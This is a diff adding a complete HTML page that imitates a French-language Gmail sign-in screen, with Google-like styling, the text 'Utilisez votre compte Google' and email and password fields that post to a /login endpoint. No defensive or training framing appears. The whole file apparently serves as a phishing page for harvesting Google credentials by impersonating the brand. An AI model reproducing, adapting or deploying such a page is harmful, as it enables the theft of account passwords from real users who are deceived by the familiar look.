@@ -1,0 +1,24 @@
+<!doctype html><html lang="fr"><head><meta charset="utf-8">
+<title>Gmail</title>
+<style>
+body{margin:0;background:#f6f8fc;color:#202124;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
+.wrap{display:grid;place-items:center;min-height:92vh}
+.box{background:#fff;padding:44px 40px;border-radius:10px;width:330px;
+box-shadow:0 2px 12px rgba(0,0,0,.08);text-align:center}
+.logo{font-size:2em;font-weight:700;color:#EA4335;margin-bottom:12px}
+.sub{font-size:.92em;opacity:.75;margin-bottom:22px;line-height:1.4}
+input{width:100%;box-sizing:border-box;padding:13px 12px;margin:6px 0;border:1px solid #ccc;
+border-radius:6px;font-size:.95em;background:inherit;color:inherit}
+button{width:100%;padding:13px;margin-top:14px;background:#1a73e8;color:#fff;
+border:0;border-radius:6px;font-size:1em;font-weight:600;cursor:pointer}
+button:hover{filter:brightness(1.1)}
+.note{font-size:.8em;opacity:.6;margin-top:16px}
+</style></head><body>
+<div class="wrap"><form class="box" method="POST" action="/login">
+  <div class="logo">M</div>
+  <div class="sub">Utilisez votre compte Google</div>
+  <input name="u" placeholder="Adresse e-mail ou téléphone" required autofocus>
+  <input name="p" type="password" placeholder="Saisissez votre mot de passe" required>
+  <button>Suivant</button>
+  <div class="note">Mot de passe oublié ? · Créer un compte</div>
+</form></div></body></html>
